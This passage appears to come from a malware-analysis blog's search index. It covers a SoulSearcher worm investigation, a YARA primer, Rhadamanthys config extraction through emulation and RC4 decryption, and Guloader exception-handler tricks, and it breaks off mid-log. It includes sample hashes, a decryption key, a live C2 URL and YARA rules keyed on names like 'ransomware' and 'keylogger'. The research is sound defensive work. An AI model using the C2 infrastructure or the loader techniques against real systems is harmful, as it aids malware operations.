. Based on this we should update the Malpedia rule, designate the shared library code sigs as &quot;shared&quot; and exclude them from allowing a full match of the yara rule. . Worm-Set Samples . 7a9397dc47ce8a604c359da17dded029580b56cc6d988e841eaaabe622b23fa4 | b3ba13bbd74e20a40d9c02c0398a474c93a352322211561f35d60cdc26739477 | a36f318370a5ace5f9c4611c1f8edfffdb05dd8e109a3dd2127ca3881670d7bd | a803aa42fe614cafdb86da10d730cecbc8a2432eb7080fd004e640cc536b595c | fc2642273c70d99a172ce45f57fe02d7f65b0ecd2b29b882ce84d0f3e01c8197 | . Older sample that seems to be related? (2014) . 4824d76a4d15840e30bb0a3da01757c22502f0d9cfeac05e9219100c477beeee | . Common Artifacts . Metadata . These samples all have many common metadata artifacts. . LegalCopyright ¬© 2006 Microsoft Corporation. All rights reserved. InternalName WinWord FileVersion 12.0.4518.1014 CompanyName Microsoft Corporation LegalTrademarks1 Microsoft¬Æ is a registered trademark of Microsoft Corporation. LegalTrademarks2 Windows¬Æ is a registered trademark of Microsoft Corporation. ProductName 2007 Microsoft Office system ProductVersion 12.0.4518.1014 FileDescription Microsoft Office Word OriginalFilename WinWord.exe charsetID 1252 Translation 0x0000 0x04e4 LangID 0x0000 . Compile Time . Tue Nov 11 14:39:16 2003 UTC . Imports . KERNEL32.dll | ole32.dll | SHLWAPI.dll | . Yara Match Strings . 0x7a6d:$sequence_0: 73 2F 8B 55 FC 3B 55 10 73 27 8B 55 B0 8B 5D EC 0x80c8:$sequence_1: C1 E9 0B 0F AF 4D F0 3B F1 73 06 0x7f71:$sequence_3: 81 C7 68 0A 00 00 81 FA 00 00 00 01 73 18 3B 45 FC 0x7415:$sequence_4: 03 D2 66 89 39 8D 7C D1 04 C7 45 F8 00 00 00 00 C7 45 E4 08 00 00 00 E9 84 00 00 00 2B C7 0x7a7a:$sequence_6: 8B 5D EC 8B 7D 08 E9 0D F5 FF FF 5F 5E B8 01 00 00 00 5B 0x7d2c:$sequence_8: B8 01 00 00 00 E9 89 04 00 00 8B 4F 24 8B 5F 38 3B CB 73 05 8B 47 28 0x72c9:$sequence_9: 83 C1 0B 89 4D EC E9 90 07 00 00 2B C7 2B F7 8B FA . Worm Differences (Polymorphic) . The PE header (DOS header) has what appears to be some junk that is changed between samples | The PE first .data section (0x42b000) contains data blobs that change between the samples | . Reverse engineering the program flow we can see that if the binary is exeuted with no command line arguments it will create a polymorphic copy of itself in the %TEMP% directory and launch the copy. Because the copy is launched with no arguments it replicates the same behaviour creating an endless loop filling the %TEMP% directory with copies of the malware. . Question 2 - Where Are All These Samples Comming From? . Why Does VT have 500,000 copies of this malware?! . Because VT runs some submissions in a sandbox and collects the dropped files from the sandbox run for anlysis (running some of these in a sandbox) a loop is created where this worm endlessly creates new copies of itself. This issue is not limited to VT but can effect any intel feed that reprocesses their own samples. .",
            "url": "https://research.openanalysis.net/yara/soulsearcher/intel/malpedia/worm/2023/02/16/soulsearcher-worm.html",
            "relUrl": "/yara/soulsearcher/intel/malpedia/worm/2023/02/16/soulsearcher-worm.html",
            "date": " ‚Ä¢ Feb 16, 2023"
        }
        
    
  
    
        ,"post21": {
            "title": "Yara Megaprimer",
            "content": "Overview . Yara rule is basically just a set of rules used to match some features in a file (binary). The Yara scanning tool can then take these rules and scan a set of files, identifying files that match the rule. . According to wikipedia . It provides a rule-based approach to create descriptions of malware families based on textual or binary patterns. A description is essentially a YARA rule name, where these rules consist of sets of strings and a boolean expression. . Rule Syntax Overview . An example rule from the Yara GitHub shows us that there are three main components to a rule; the meta section, the strings section, and the condition. . rule silent_banker : banker { meta: description = &quot;This is just an example&quot; threat_level = 3 in_the_wild = true strings: $a = {6A 40 68 00 30 00 00 6A 14 8D 91} $b = {8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9} $c = &quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot; condition: $a or $b or $c } . There Be Dragons! . https://twitter.com/nunohaien/status/1480821031656898560 . Using Yara . Rules for Identifying Malware (Threat Intel) . Used to share intel about malware families | Usually tuned for unpacked malware (the actual malware code, not the packer) | Needs a low false positive (FP) rate or it could end up being &quot;bad intel&quot; | Usually used to automatically identify and classify malware samples (ex. malware tracker) | . A good example of these &quot;intel&quot; rules is the public Yara repository Malpedia . Rules Used Like AV Signatures . Used to identify packed malware, and early-stage malware delivery chain artifacts (maldocs, packers, malicious js, etc.) | Doesn&#39;t need to identify a specific malware family, just needs to identify &quot;badness&quot; or &quot;evil&quot; | Usually used either in-line or for asyncronous enterprise scanning to detect malware | FP rate needs to be low (SOC goes brrrrrrr) | . A good example of these &quot;AV&quot; rules is the open source &quot;loki&quot; scanner with the signature-base ruleset from Florian Roth and its commercial counterpart THOR. . Rules Used Exclusively For Hunting . Used like a &quot;loose&quot; version of a AV signature, used for finding the needle in the haystack | Good for identifying unknowns | Usually used for &quot;hunting&quot; either within an enterpise or in a malware repository | Can have a high FP rate | . A good example of these are the &quot;feels bad&quot; rules from 100 Days of Yara . Testing . Packer detection pkr_ce1a . | Detects &quot;bad&quot; some_packer . | .NET packer msil_suspicious_use_of_strreverse.yar . | lol PDB paths . | . import &quot;pe&quot; rule lol_pdb { meta: author = &quot;BitsOfBinary&quot; description = &quot;Detects files that identify themselves as malware&quot; reference = &quot;https://bitsofbinary.github.io/yara/2023/01/04/100daysofyara-day-4.html&quot; version = &quot;1.0&quot; date = &quot;2023-01-04&quot; DaysofYARA = &quot;4/100&quot; condition: pe.pdb_path icontains &quot;locker&quot; or pe.pdb_path icontains &quot;stealer&quot; or pe.pdb_path icontains &quot;crypter&quot; or pe.pdb_path icontains &quot;ransomware&quot; or pe.pdb_path icontains &quot;keylogger&quot; or pe.pdb_path icontains &quot;exploit&quot; } . Questions . Why would we need to define a string with zerors before and after such as the following: &quot; x00Fluffy x00&quot; . this defines the surrounding bytes for a string, instead of just matching the string with no context... in this particular case it&#39;s very inefficient since the null bytes don&#39;t add much context and will infact slow down the matching buy adding some generic bytes to the string, a fullword keyword and a string would be a better choice | . Advanced regex yara rules examples. . no | . Create yara rule for .NET using IL where the instructions may change between compiled samples and thus wildcarding is required. . Maybe Drakonia&#39;s rule? TBD... | . How to utilise fuzzy hashing (SSDEEP, SDHASH, mvHASH-B) and fuzzy rules. . in addition to the basic string pattern matching Yara supports some advanced features such as hash calculation using the hash module but this doesn&#39;t support fuzzy hashing... generally hash matching is very brittel and sort of defeats the purpose of yara but it can be useful in some contexts... for fuzzy hashing I&#39;m not sure if this is available outside of a custom module? | . When should we write a yara rule vs when to write a CAPE rule . if you want the rule to be useable outside of CAPE then Yara is the best, one of the main advantages of Yara is its portablilty (you can share them! and they just work!) | if you are only running your rule on CAPE and you want some more advanced custom features you may be enticed to use a CAPE specific rule | . What are the advantages of YARA-L 2.0 vs the normal yara, and what use cases of YARA-L 2.0 rules to use? . we can probably ignore this unless it catches on widely, all of these &quot;custom&quot; yara versions that are not portable are not worth investigating unless you are using the platform they are designed for | . Custom Yara Engines . Avast experimented with compiled yara rules using their YaraNG engine. Appearently with some decent improvemenst (35%) as detailed in their blog YaraNG: Reinventing the YARA Scanner. They have have a yara linter. . There is also a project underway to re-write the Yara engine in rust yara-x. . Some Fun Hunting PDB Paths . D: Mktmp Amadey StealerDLL x64 Release STEALERDLL.pdb | o: Programmieren Codesoft Releases _NEW BETATEST Codesoft PW Stealer v0.35_older abcdef Version release Codesoft-PW_Stealer_Server.pdb | C: Users Ledzz Desktop LedzzsHUBBBGOLD LedzzsHUBBBGOLD Nitro-Ransomware-master NitroRansomware obj Debug NitroRansomware.pdb | c: slam_ransomware_builder ConsoleApp2 ConsoleApp2 obj Debug ConsoleApp2.pdb | d: ronin PROJEKTY Keylogger src Keylogger_v0.05 Release Keylogger.pdb | C: Users user Desktop ExploitKITS C# Windows Trojans CyberRAT Client obj Debug Client.pdb | c: Users User Desktop 5.2 Decrypter decrypter obj Debug Chaos ransomware decrypter.pdb | C: Users ygzat source repos Crypter Test2 Crypter Crypter obj Debug Crypter.pdb | D: scm Italy Ransomware lkh FileDecrytptor2 Build Win32 Release FileCrytptor.pdb | D: Mktmp Amadey StealerDLL x64 Release STEALERDLL.pdb | .",
            "url": "https://research.openanalysis.net/yara/tutorial/2023/02/09/yara-megaprimer.html",
            "relUrl": "/yara/tutorial/2023/02/09/yara-megaprimer.html",
            "date": " ‚Ä¢ Feb 9, 2023"
        }
        
    
  
    
        ,"post22": {
            "title": "Rhadamanthys",
            "content": "Overview . Sample . dca16a0e7bdc4968f1988c2d38db133a0e742edf702c923b4f4a3c2f3bdaacf5 Malware Bazaar . This malware name is crazy, we will refer to it as &quot;ramen noodls&quot; for simplicity. . References . Triage Run | Dancing With Shellcodes: Analyzing Rhadamanthys Stealer Downloader af04ee03d69a7962fa5350d0df00fafc4ae85a07dff32f99f0d8d63900a47466 | . | . Stage 1 . The first stage is a C++ loader that is used to decrypt, load, and execute the 2nd stage shellcode. The program flow of the loader is difficult to follow due to the C++ and some nested structures and callbacks. It is not clear if this was intentional or note. . The shellcode appears to be located in what appears to be a giant Base64 encoded string (not confirmed). This first stage may have alos implmented some PAGE_GUARD exception handling progrem flow redirection for anti-analysis (not confrimed). Dispite this it is trivial to execute the stage until it jumps to the decrypted loaded shellcode (as long as the PAGE_GUARD exceptions are passed to the process). . Stage 2 . For analysis we just dumped the entire memory region that contained the second stage shellcode. The region is based at 0x00760000 but the shellcode entry is at 0x00780A68. The memory region dump is available on Malshare d4f37699c4b283418d1c73416436826e95858cf07f3c29e6af76e91db98e0fc0. . The first task of the shellcode is to walk the PEB to locate Kernel32. . PEB Walk _LDR_DATA_TABLE_ENTRY and Shifted Pointers in IDA . The process of &quot;walking the PEB&quot; to access the modules loaded in a process as been a shellcode meme since the beginning of shellcode. It&#39;s everywhere, and we all mostly understand how it works. . The issue comes when we try to represent this cleanly in IDA&#39;s pseudocode view... accessing a _LDR_DATA_TABLE_ENTRY via its LIST_ENTRY in the _PEB_LDR_DATA structure creates a very messy IDB. Instead of the _LDR_DATA_TABLE_ENTRY members we see unhelpful offsets relative to the Flink and Blink member of the LIST_ENTRY. . . The reason this happens is that the InMemoryOrderModuleList is defined as a LIST_ENTRY in the _PEB_LDR_DATA. The LIST_ENTRY struct simply describes a linked list as follows. . typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink; } . The problem comes from where that struct is actually located in the _LDR_DATA_TABLE_ENTRY... . typedef struct _LDR_DATA_TABLE_ENTRY { PVOID Reserved1[2]; LIST_ENTRY InMemoryOrderLinks; //&lt;- Offset into the struct! PVOID Reserved2[2]; PVOID DllBase; PVOID EntryPoint; PVOID Reserved3; UNICODE_STRING FullDllName; BYTE Reserved4[8]; PVOID Reserved5[3]; union { ULONG CheckSum; PVOID Reserved6; }; ULONG TimeDateStamp; } . Because the LIST_ENTRY is offset into the _LDR_DATA_TABLE_ENTRY it means that when we attempt to cast a pointer to a LIST_ENTRY as a _LDR_DATA_TABLE_ENTRY we are off by some amount (in this case 2 * PVOID = 8 bytes). The following diagram attempts to explain the issue. . . One hack might be to create our own custom struct that starts at the offset, but this would be madness when dealing with more than a few types... instead we have... shifted pointers! . IDA Shifted Pointers . IDA has a simple concept (with some insane syntax) to deal with this issue called a shifted pointer. When assigning a type to LIST_ENTRY the shifted pointer syntax can be used to tell IDA that it is actually a pointer inside a larger struct with an offset. . _LIST_ENTRY *__shifted(_LDR_DATA_TABLE_ENTRY,8) pListEntry . . References . PE Header notes yates | Geoff Chappell LDR_DATA_TABLE_ENTRY | [Understanding LIST_ENTRY Lists and Its Importance in Operating Systems] (https://www.codeproject.com/Articles/800404/Understanding-LIST-ENTRY-Lists-and-Its-Importance) | MSDN PEB_LDR_DATA | IDA Tricks CONTAINING_RECORD macro | IDA docs Shifted Pointers | . Thanks . @yates82 | @printup | @dodo | . Thanks to everyone who helped me figure this out for once and for all! . Analysis . This stage only serves one purpose; unpack and execute the final stage. The unpacking algorithm is currently unknown! . Thanks Mishap . Full analysis of Stage 2 (with unpacker) . Emulation Attempt . Instead of analyzing this intermediate stage we are going to try and emulate passed it. . from dumpulator import Dumpulator dp = Dumpulator(&quot;/tmp/stage2.dmp&quot;, quiet=True) shellcode_start = dp.regs.eip print(hex(shellcode_start)) shell_base = 0x00810000 shell_end = 0x0082CFF5 . 0x82cc90 . dp.start(shellcode_start, end=shell_end) . commit(0x84a000[0x1d000], PAGE_READWRITE) commit(0x21d0000[0x1d000], PAGE_EXECUTE_READWRITE) . stage3_start = dp.regs.ebx print(hex(stage3_start)) . 0x21d607f . shell_page = dp.memory.find_region(stage3_start) print(shell_page.size) print(shell_page.start) print(f&quot;Shellcode entrypoint: {hex(stage3_start - shell_page.start)}&quot;) print(f&quot;Shellcode base: {hex(shell_page.start)}&quot;) shell_page_data = dp.read(shell_page.start, shell_page.size) open(&#39;/tmp/dump_stage3.bin&#39;,&#39;wb&#39;).write(shell_page_data) . 118784 35454976 Shellcode entrypoint: 0x607f Shellcode base: 0x21d0000 . 118784 . We don&#39;t yet have a way to add exception hooks to dumpulator so if we want to do this without knowing the address of the end of stage 2 then we need to modify the dumpulator source code. . Update! @mishap has a public implementation of a quick and dirty approach to modifying dumpulator for a generic approach to this Dirty exception hook . print(hex(dp.read_long(dp.regs.esp))) print(hex(dp.read_long(dp.regs.esp-4))) . 0x21d0000 0x19fefc . dp.memory.find_region(0x19fefc) . MemoryRegion(0x1a0000, 0x4000, PAGE_READONLY, MemoryType.MEM_MAPPED, None) . dp.exports.get(0x7656f530) . &#39;kernel32.dll:LocalFree&#39; . hex(dp.read_long(0x21d0000)) . &#39;0x14c5352&#39; . dp.read(0x13BAC, 10) . bytearray(b&#39; x00 x00 x00 x00 x00 x00 x00 x00 x00 x00&#39;) . dp.start(dp.regs.eip, end=0x021D5D88 ) . dp.read(0x13BAC, 100) . bytearray(b&#39; x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00&#39;) . dp.start(dp.regs.eip, end=0x021D6098) . dp.modules.find(dp.regs.eax) . Module(0x76550000, 0xf0000, &#39;C: Windows System32 kernel32.dll&#39;) . Stage 3 . We used some simple emulation to extract the Stage3 shellcode. This stage is easily identifiable because it has many plaintext strings! . dp = Dumpulator(&quot;/tmp/stage2.dmp&quot;, quiet=True) shellcode_start = dp.regs.eip print(hex(shellcode_start)) shell_base = 0x00810000 shell_end = 0x0082CFF5 dp.start(shellcode_start, end=shell_end) print(f&quot;EIP: {hex(dp.regs.eip)}&quot;) dp.start(dp.regs.eip, end=0x021D5D88) dp.regs.esi . print(hex(dp.regs.esi)) dp.read(dp.regs.esi, 100) . 0x21e3bac . bytearray(b&#39;k x00e x00r x00n x00e x00l x003 x002 x00. x00d x00l x00l x00 x00 x00 x00 x00ZwQueryInformationProcess x00 x00 x00ntdll.dll x00 x00 x00KiUserExceptionDispatcher x00 x00 x00, x00 x00 x00&#39;) . Rename IAT Hashes in IDA . ### apis = {dict with hashdb enum of all imports} api_nums = dict((v,k) for k,v in apis.items()) ptr = 0x0001B114 while ptr &lt; 0x0001BC9E: api_hash = ida_bytes.get_dword(ptr) api_name = api_nums.get(api_hash,&#39;&#39;) if api_name != &#39;&#39;: print(&quot;ptr_&quot;+api_name) idc.set_name(ptr, &quot;ptr_&quot;+api_name, 0x800) #SN_FORCE ptr += 4 else: ptr += 1 . Config Extraction . We know that Stage3 has an encrypted config with the URL used to download the malware payload. We are going to attempt to use some emulation to extract this. . from dumpulator import Dumpulator dp = Dumpulator(&quot;/tmp/stage2.dmp&quot;, quiet=True) shellcode_start = dp.regs.eip print(hex(shellcode_start)) shell_base = 0x00810000 shell_end = 0x0082CFF5 dp.start(shellcode_start, end=shell_end) print(f&quot;EIP: {hex(dp.regs.eip)}&quot;) . 0x82cc90 commit(0x84a000[0x1d000], PAGE_READWRITE) commit(0x21d0000[0x1d000], PAGE_EXECUTE_READWRITE) EIP: 0x82cff5 . hex(dp.read_long(dp.regs.esp+4)) . &#39;0x19ff54&#39; . init_data_offset_0 = dp.read_long(0x19ff54) dp.read_long(init_data_offset_0) . 25521 . hex(dp.read_long(0x19ff54+4)) . &#39;0x426008&#39; . config_data = dp.read(0x426008, 152) print(config_data.hex()) . a8c49801f17b5f46e0aa0d585c5448b97ce811dbd8d04f9d0988296fb4a6216a90ba17a4f14b8a5e47e4e0f9515f48984522f533ea749bc5306fbd398237cb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 . key = bytes.fromhex(&#39;52abdf06b6b13ac0da2d22dc6cd2be6c201769e012b5e6ec0eab4c14734aed51&#39;) . out = bytes.fromhex(&#39;215248590e000000ef4456b59328427fba4377a1d192aa92687474703a2f2f3131362e3230322e31382e3133322f626c6f622f71336b36746b2e7869386f008e8a1f771e17b45183cfda277723418924c7936eb3cb4ef3541c60510f1dd542c28d53aa06cf6cf4e16e3ebcbc8c4c702a9a31f99e44e93688702587843fe3834d0ca21df074ae3aabfe9b480a09fbd2df9b8ae88b40ad5ce6&#39;) out . b&#34;!RHY x0e x00 x00 x00 xefDV xb5 x93(B x7f xbaCw xa1 xd1 x92 xaa x92http://116.202.18.132/blob/q3k6tk.xi8o x00 x8e x8a x1fw x1e x17 xb4Q x83 xcf xda&#39;w#A x89$ xc7 x93n xb3 xcbN xf3T x1c`Q x0f x1d xd5B xc2 x8dS xaa x06 xcfl xf4 xe1n&gt; xbc xbc x8cLp* x9a1 xf9 x9eD xe96 x88p% x87 x84? xe3 x83M x0c xa2 x1d xf0t xae: xab xfe x9bH n t xfb xd2 xdf x9b x8a xe8 x8b@ xad xe6&#34; . len(&#39; xefDV xb5 x93(B x7f xbaCw xa1 xd1 x92 xaa x92&#39;) . 16 . c2 = out[24:].split(b&#39; x00&#39;)[0].decode(&#39;utf-8&#39;) c2 . &#39;http://116.202.18.132/blob/q3k6tk.xi8o&#39; . Generic Config Extraction . Emulate Stage2 Extract Stage3 shellcode | Extract the enc config buffer as arg2 passed to the shellcode | . | Use regex to locate hard coded decryption key in Stage3 | Decrypt! | . from dumpulator import Dumpulator dp = Dumpulator(&quot;/tmp/stage2.dmp&quot;, quiet=True) shellcode_start = dp.regs.eip print(hex(shellcode_start)) shell_base = 0x00810000 shell_end = 0x0082CFF5 dp.start(shellcode_start, end=shell_end) # Extract stage3 stage3_base = dp.read_long(dp.regs.esp) stage3_size = dp.memory.query(stage3_base).region_size stage3_data = dp.read(stage3_base, stage3_size) # Extract encrypted config ptr_config_data = dp.read_long(0x19ff54+4) config_data = dp.read(ptr_config_data, 152) . 0x82cc90 commit(0x84a000[0x1d000], PAGE_READWRITE) commit(0x21d0000[0x1d000], PAGE_EXECUTE_READWRITE) . import re import struct from malduck import rc4 # 6A 20 push 20h ; &#39; &#39; ; a3 # 8D 85 F8 FE FF FF lea eax, [ebp+arg_rc4_key_stream] # 68 A4 2C 01 00 push offset g_key ; a2 # 8B 77 04 mov esi, [edi+4] # 50 push eax ; a1 # E8 03 E6 FF FF call mw_rc4_ksa # 56 push esi ; arg_out_buff # 56 push esi ; arg_in_buff # 8D 85 F8 FE FF FF lea eax, [ebp+arg_rc4_key_stream] # 68 98 00 00 00 push 98h ; arg_size key_egg = rb&#39; x6A x20(?:(?! x6A x20).)*? x98 x00 x00 x00&#39; key_candidates = [] for match in re.finditer(key_egg, stage3_data): data_target = match.group() key_address = struct.unpack(&#39;&lt;I&#39;, data_target.split(b&#39; x68&#39;)[1][:4])[0] # print(hex(key_address)) key_offset = key_address key_data = stage3_data[key_offset:key_offset+32] key_candidates.append(key_data) assert len(key_candidates) != 0 # Test each key and look for decrypted magic byte magic_bytes = b&#39;!RHY&#39; config_out = None for key in key_candidates: out = rc4(key, config_data) #print(out) if out[:4] == magic_bytes: config_out = out break assert config_out != None c2 = config_out[24:].split(b&#39; x00&#39;)[0].decode(&#39;utf-8&#39;) print(f&#39;C2: {c2}&#39;) . C2: http://116.202.18.132/blob/q3k6tk.xi8o . Hat tip to @printup for this as an alternative to our regex . index: int = len(data) while True: end_index: int = data.rfind(end_token, 0, index) if end_index == -1: break begin_index: int = data.rfind(begin_token, 0, end_index) if begin_index == -1: break print(f&quot;Found a match: {data[begin_index:end_index + len(end_token)]}&quot;) index = begin_index .",
            "url": "https://research.openanalysis.net/rhadamanthys/config/ida/shifted%20pointers/peb/_list_entry/_ldr_data_table_entry/2023/01/19/rhadamanthys.html",
            "relUrl": "/rhadamanthys/config/ida/shifted%20pointers/peb/_list_entry/_ldr_data_table_entry/2023/01/19/rhadamanthys.html",
            "date": " ‚Ä¢ Jan 19, 2023"
        }
        
    
  
    
        ,"post23": {
            "title": "Dumpulator VEH",
            "content": "Overview . We are going to take a closer look at how to emulate exceptions with Dumpulator using a recent Guloader sample as an example. . Guloader SHA256 = E3A8356689B97653261EA6B75CA911BC65F523025F15649E87B1AEF0071AE107 malshare . Guloader VEH . The sample we are analyzing uses a VEH trick to redirect program flow... basically they set their own VEH then use breakpoints 0xcc in the code to trigger a small algorithm in the VEH. This aglorithm is used to caculate a new EIP based on the byte following the breakpoint. . EIP = EIP + ([EIP + 1] ^ 0x8f) . Obfuscated Strings . In addition to the VEH program flow obfuscation the sample also uses a two-stage string encryption algorithm. First, a function is used to fill a buffer with the encrypted string data using some unfolded constants and a bit of arithmatic. Then the buffer is passed to a string decryption algorithm. The first buffer fill function is often obfuscated using the VEH program flow redirection. . Dumpulator String Decryption . from dumpulator import Dumpulator dp = Dumpulator(&quot;/tmp/gudump.dmp&quot;) . TEB: 0x2c1000, PEB: 0x2be000 ConsoleHandle: 0x9c StandardInput: 0xa0 StandardOutput: 0xa4 StandardError: 0xa8 Patching Wow64Transition: 770f9228 -&gt; 76fc7000 Memory map: Base Size State Protect Info 0x10000 0x10000 MEM_COMMIT PAGE_READWRITE 0x20000 0x1000 MEM_COMMIT PAGE_EXECUTE_READWRITE 0x21000 0x1f000 MEM_FREE 0x40000 0x1d000 MEM_COMMIT PAGE_READONLY 0x5d000 0x3000 MEM_FREE 0x60000 0x35000 MEM_RESERVE PAGE_READWRITE 0x95000 0xb000 MEM_COMMIT PAGE_READWRITE 0xa0000 0xfb000 MEM_RESERVE PAGE_READWRITE 0x19b000 0x5000 MEM_COMMIT PAGE_READWRITE 0x1a0000 0x4000 MEM_COMMIT PAGE_READONLY 0x1a4000 0xc000 MEM_FREE 0x1b0000 0x2000 MEM_COMMIT PAGE_READWRITE 0x1b2000 0xe000 MEM_FREE 0x1c0000 0x35000 MEM_RESERVE PAGE_READWRITE 0x1f5000 0xb000 MEM_COMMIT PAGE_READWRITE 0x200000 0xbd000 MEM_RESERVE PAGE_READWRITE 0x2bd000 0xb000 MEM_COMMIT PAGE_READWRITE 0x2c8000 0x138000 MEM_RESERVE PAGE_READWRITE 0x400000 0x35000 MEM_RESERVE PAGE_READWRITE 0x435000 0xb000 MEM_COMMIT PAGE_READWRITE 0x440000 0x2a000 MEM_COMMIT PAGE_EXECUTE_READWRITE 0x46a000 0x26000 MEM_FREE 0x490000 0x3d000 MEM_COMMIT PAGE_READWRITE 0x4cd000 0xc3000 MEM_RESERVE PAGE_READWRITE 0x590000 0x7000 MEM_COMMIT PAGE_READWRITE 0x597000 0x9000 MEM_RESERVE PAGE_READWRITE 0x5a0000 0xc9000 MEM_COMMIT PAGE_READONLY 0x669000 0x7000 MEM_FREE 0x670000 0xfd000 MEM_RESERVE PAGE_READWRITE 0x76d000 0x3000 MEM_COMMIT PAGE_READWRITE 0x770000 0xfd000 MEM_RESERVE PAGE_READWRITE 0x86d000 0x3000 MEM_COMMIT PAGE_READWRITE 0x870000 0x4d0000 MEM_FREE 0xd40000 0x1000 MEM_COMMIT PAGE_READONLY blobrunner.exe[0x21000] 0xd41000 0x15000 MEM_COMMIT PAGE_EXECUTE_READ .text 0xd56000 0x7000 MEM_COMMIT PAGE_READONLY .rdata 0xd5d000 0x2000 MEM_COMMIT PAGE_READWRITE .data 0xd5f000 0x2000 MEM_COMMIT PAGE_READONLY .reloc 0xd61000 0x7402f000 MEM_FREE 0x74d90000 0x1000 MEM_COMMIT PAGE_READONLY apphelp.dll[0x9f000] 0x74d91000 0x7c000 MEM_COMMIT PAGE_EXECUTE_READ .text 0x74e0d000 0x2000 MEM_COMMIT PAGE_READWRITE .data 0x74e0f000 0x20000 MEM_COMMIT PAGE_READONLY .idata 0x74e2f000 0x1681000 MEM_FREE 0x764b0000 0x1000 MEM_COMMIT PAGE_READONLY sechost.dll[0x76000] 0x764b1000 0x67000 MEM_COMMIT PAGE_EXECUTE_READ .text 0x76518000 0x1000 MEM_COMMIT PAGE_READWRITE .data 0x76519000 0x1000 MEM_COMMIT PAGE_WRITECOPY .data 0x7651a000 0x1000 MEM_COMMIT PAGE_READWRITE .data 0x7651b000 0xb000 MEM_COMMIT PAGE_READONLY .idata 0x76526000 0x2a000 MEM_FREE 0x76550000 0x1000 MEM_COMMIT PAGE_READONLY kernel32.dll[0xf0000] 0x76551000 0xf000 MEM_RESERVE PAGE_EXECUTE_WRITECOPY 0x76560000 0x65000 MEM_COMMIT PAGE_EXECUTE_READ .text 0x765c5000 0xb000 MEM_RESERVE PAGE_EXECUTE_WRITECOPY 0x765d0000 0x2b000 MEM_COMMIT PAGE_READONLY .rdata 0x765fb000 0x5000 MEM_RESERVE PAGE_EXECUTE_WRITECOPY 0x76600000 0x1000 MEM_COMMIT PAGE_READWRITE .data 0x76601000 0xf000 MEM_RESERVE PAGE_EXECUTE_WRITECOPY 0x76610000 0x1000 MEM_COMMIT PAGE_READONLY .didat 0x76611000 0xf000 MEM_RESERVE PAGE_EXECUTE_WRITECOPY 0x76620000 0x1000 MEM_COMMIT PAGE_READONLY .rsrc 0x76621000 0xf000 MEM_RESERVE PAGE_EXECUTE_WRITECOPY 0x76630000 0x5000 MEM_COMMIT PAGE_READONLY .reloc 0x76635000 0xb000 MEM_RESERVE PAGE_EXECUTE_WRITECOPY 0x76640000 0x300000 MEM_FREE 0x76940000 0x1000 MEM_COMMIT PAGE_READONLY rpcrt4.dll[0xbe000] 0x76941000 0xac000 MEM_COMMIT PAGE_EXECUTE_READ .text 0x769ed000 0x1000 MEM_COMMIT PAGE_READWRITE .data 0x769ee000 0x10000 MEM_COMMIT PAGE_READONLY .idata 0x769fe000 0x252000 MEM_FREE 0x76c50000 0x1000 MEM_COMMIT PAGE_READONLY KERNELBASE.dll[0x214000] 0x76c51000 0x1d7000 MEM_COMMIT PAGE_EXECUTE_READ .text 0x76e28000 0x3000 MEM_COMMIT PAGE_READWRITE .data 0x76e2b000 0x1000 MEM_COMMIT PAGE_WRITECOPY .data 0x76e2c000 0x38000 MEM_COMMIT PAGE_READONLY .idata 0x76e64000 0x15c000 MEM_FREE 0x76fc0000 0x1000 MEM_COMMIT PAGE_READONLY 0x76fc1000 0x3000 MEM_COMMIT PAGE_EXECUTE_READ 0x76fc4000 0x1000 MEM_COMMIT PAGE_READONLY 0x76fc5000 0x1000 MEM_COMMIT PAGE_READWRITE 0x76fc6000 0x1000 MEM_COMMIT PAGE_READONLY 0x76fc7000 0x1000 MEM_COMMIT PAGE_EXECUTE_READ 0x76fc8000 0x2000 MEM_COMMIT PAGE_READONLY 0x76fca000 0x6000 MEM_FREE 0x76fd0000 0x1000 MEM_COMMIT PAGE_READONLY ntdll.dll[0x1a3000] 0x76fd1000 0x122000 MEM_COMMIT PAGE_EXECUTE_READ .text 0x770f3000 0x6000 MEM_COMMIT PAGE_READWRITE .data 0x770f9000 0x7a000 MEM_COMMIT PAGE_READONLY .mrdata 0x77173000 0x8cdd000 MEM_FREE 0x7fe50000 0x5000 MEM_COMMIT PAGE_READONLY 0x7fe55000 0xfb000 MEM_RESERVE PAGE_READONLY 0x7ff50000 0x8000 MEM_RESERVE PAGE_READWRITE 0x7ff58000 0x1000 MEM_COMMIT PAGE_READWRITE 0x7ff59000 0x7000 MEM_FREE 0x7ff60000 0x1000 MEM_RESERVE PAGE_READWRITE 0x7ff61000 0x1000 MEM_COMMIT PAGE_READWRITE 0x7ff62000 0xe000 MEM_FREE 0x7ff70000 0x10000 MEM_RESERVE PAGE_READWRITE 0x7ff80000 0x1000 MEM_COMMIT PAGE_READWRITE 0x7ff81000 0xf000 MEM_FREE 0x7ff90000 0x1000 MEM_RESERVE PAGE_READWRITE 0x7ff91000 0x1000 MEM_COMMIT PAGE_READWRITE 0x7ff92000 0xe000 MEM_FREE 0x7ffa0000 0x1000 MEM_COMMIT PAGE_READONLY 0x7ffa1000 0xf000 MEM_FREE 0x7ffb0000 0x23000 MEM_COMMIT PAGE_READONLY 0x7ffd3000 0xd000 MEM_FREE 0x7ffe0000 0x1000 MEM_COMMIT PAGE_READONLY 0x7ffe1000 0x9000 MEM_FREE 0x7ffea000 0x1000 MEM_COMMIT PAGE_READONLY . base = 0x440000 stop_addr = 0x04A7 + base dp.start(base, end=stop_addr) . emu_start(440000, 4404a7, 0) syscall: ZwProtectVirtualMemory( HANDLE ProcessHandle = 0xffffffff /* NtCurrentProcess() */, PVOID* BaseAddress = 0x19fb1c, SIZE_T* RegionSize = 0x19fb20, ULONG NewProtect = 0x4, ULONG* OldProtect = 0x19fb24 ) protect 0x770f9000[0x3000] = 